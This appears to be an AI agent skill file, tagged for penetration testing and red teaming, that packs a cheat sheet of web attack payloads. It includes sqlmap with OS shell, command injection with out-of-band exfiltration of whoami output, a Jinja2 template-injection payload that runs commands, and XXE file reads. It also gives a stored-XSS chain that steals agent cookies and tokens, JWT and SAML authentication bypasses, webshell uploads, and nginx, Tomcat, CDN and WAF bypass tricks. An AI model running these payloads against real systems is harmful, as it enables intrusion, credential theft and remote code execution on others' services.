---
name: web-attack-methods
description: >-
  Full-stack Web attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL, JWT/OAuth/SAML authentication, LFI/uploads, Tomcat/WS/STOMP/XFF/PATH_INFO/CDN 502/WSCN JS challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [penetration-testing, red-team]
---

## Web Attack Techniques (Injection / Authentication / Server-Side / Miscellaneous / CDN)

```
=== Web Injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual tests ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass with SEL/**/ECT, case changes, CHAR() | escalate OUTFILE→webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, replace cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP chat: customer-service systems(OCS/LiveChat) often render visitor messages with innerHTML/v-html in the agent panel(Vue domProps innerHTML)
  Attack chain: visitor STOMP connection→send a message containing <img src=x onerror=fetch(...)>→agent opens the conversation→XSS executes in the agent browser→steal cookie/token/localStorage
  Key point: the agent browser can usually reach the internet(not restricted by the backend air gap)! Payload targets: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1(visitor identity), tp:0(text type) go directly to innerHTML; image messages use the url field(<img src>) and bypass innerHTML
SSRF: bypass IP filters with 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication and Authorization ===
Authentication bypass: admin'-- | password reset(predictable token/Host-header injection) | MFA bypass(skip/brute-force 4-6 digits) | rotate IP with X-Forwarded-For
IDOR: change the resource ID for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C brute-force weak secrets | kid injection | jku/x5u remote keys
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation(replacement/suffix/@ confusion/path traversal) | missing state→CSRF | PKCE downgrade | apply all JWT attacks to id_token
SAML: XSW signature wrapping(SAML Raider) | signature removal | comment truncation admin<!---->@evil | Golden SAML(IdP private key)

=== Server-Side ===
LFI: ../../../etc/passwd | php://filter read source | data:// expect:// phar:// | RCE chain: log poisoning/session poisoning/phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | change parsing with .htaccess | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator path traversal bypasses authentication interceptors: an interceptor matches /api/* while actuator is allowlisted→/actuator/../api/v1/endpoint bypasses the interceptor and reaches a protected endpoint
  Principle: Spring Security/custom interceptors match paths before normalization, while Tomcat routes after path normalization→path traversal bypasses the interceptor but reaches the target Servlet
  Verify: /actuator/health returns 200(allowlisted)→/actuator/../target also returns 200(bypassed) vs direct /target returns 403/sign is empty(blocked) | /actuator/health/../../target(template path {*path} traversal)
  Weak sign validation: many custom sign checks only require a non-empty header(sign:any value+expTime:any number passes)→code:500 instead of "sign is empty" means validation passed | quick check: sign:0 or sign:aaa changes "sign is empty" to 500=only non-empty validation
  Escalation: after bypassing, combine with X-HTTP-Method-Override: POST so a GET request triggers a POST handler(supported by some Spring configurations)

=== Web Miscellaneous ===
🚨Tomcat ..;/ bypasses nginx path restrictions: nginx does not parse ; in a URL(treats it as part of the path), but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/(allowed) → Tomcat resolves it to /admin/path(traversal!)
  Verify: normal /admin returns nginx 403, while /api/v1/v/..;/admin returns Tomcat 404 = successful bypass
  Limitation: Spring MVC DispatcherServlet routing is independent of the filesystem and can only access static files/non-MVC paths in the same WAR
  Combination: pair with a JSP webshell written through Spring4Shell, or access actuator endpoints
🚨WebSocket/STOMP frames bypass nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but STOMP frames are unrestricted after a WebSocket upgrade:
  1. GET /api/v1/v/ws/{3-digits}/{8-random-characters}/websocket → 101 Upgrade (bypass through the visitor path)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → directly reach the Spring backend
  SockJS XHR alternative: POST STOMP frames to .../xhr_send(204=success), without a real WebSocket
  Trap: CDN disconnects quickly("Another connection still open"); a raw socket is more stable than a websocket library
🚨X-Forwarded-For bypasses application-layer IP blacklists: the CDN trusts XFF and the application obtains the client IP from XFF for blacklist checks:
  Effective: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Ineffective: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detect: the response contains {code:10010, msg:"blacklist"} and the data field is your real IP
🚨PATH_INFO nginx deny bypass: nginx denies .php files(returns a 146B nginx 404), but PHP-FPM remains reachable through PATH_INFO:
  /denied/file.php → 404|146(nginx blocked) | /denied/file.php/ → 16B "File not found."(PHP-FPM executed!)
  /denied/file.php/x → same result. PHP-FPM returning "File not found." means the request passed through nginx deny and reached PHP-FPM(the script path is merely incorrect)
  Exploit: if PHP has cgi.fix_pathinfo=1(default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming existence, find the actual FPM docroot(which may differ from nginx)
  Identify: nginx deny returns a fixed size(146B standard 404), while PHP-FPM returns 16B "File not found." → the size difference is a breakthrough signal
🚨Response-size fingerprinting(hidden-file discovery): a CMS catch-all route returns a fixed-size home page(e.g. 44004B), while a real nginx 404 returns 146B
  File exists but is denied: returns 146B(nginx 404) | file does not exist: returns catch-all size(44004B) | → 146B=the file truly exists!
  Method: batch-scan paths and classify by response size: catch-all=nonexistent, nginx 404=exists but denied, other sizes=accessible
WAF bypass decision tree: encoding→protocol level→path→mutation→IP spoofing→smuggling | CORS: reflected Origin+Credentials:true
🚨CDN 502 bypass(URL-pattern filtering): when the CDN returns 502 for admin paths and HTTP encoding/smuggling/method changes all fail→switch protocol:
  ①WebSocket upgrade: CDNs usually filter only HTTP responses; WS paths may not be covered. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502=WS path is unfiltered
  ②Find the origin IP and connect directly: historical DNS/certificate transparency/SNI scanning/same-subnet scanning/mail-header Return-Path/Shodan fingerprint matching/CDN origin configuration disclosure/unique error-page fingerprint→bypass CDN and connect directly to the backend
  ③Nonstandard ports: scan all ports on CDN nodes; some ports may proxy different backends or use different filtering rules(e.g. 8085 exposes actuator)
  ④Path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin while the CDN may not recognize it(note: the CDN may still filter the response)
  ⑤Wildcard resolution identification: all subdomains resolve to the CDN=wildcard DNS, not real records. Compare results from 114.114.114.114 and 8.8.8.8
🚨WSCN CDN JS challenge identification and bypass: response contains `_jsc_ch_conf`+`ws_sec_page.js`=WSCN JS challenge(not a WAF block)
  Indicators: cv:".domain",mt:"jhsq987",chType/chTs/chID/chHash fields | 403 page is 6000+ bytes and contains "Embed Iframe"
  Bypass: the CDN exempts only specific allowlisted paths(e.g. /c/) from challenges→use Spring Boot ..;/ traversal(`/c/..;/target_path`) to reach other backend routes
  Identify backend framework: JSON error `{"timestamp":...,"status":...,"error":...,"path":...}`=Spring Boot | 405=route exists but method is wrong

=== CDN Bypass(target hidden behind CDN, admin endpoint receives 502) ===
CDN 502 analysis: distinguish URL-pattern filtering(fixed timing ~0.3s; every method/encoding/port/node returns 502) vs response-content filtering vs backend outage
  Key determination: if path traversal(`/api/v1/v/..;/a/doLogin`) returns Tomcat 404=passed through the CDN to the backend; 502=CDN URL-pattern block
  nginx 502 vs CDN PWS 502: nginx=edge reverse proxy is down; PWS=CDN-wide policy
```
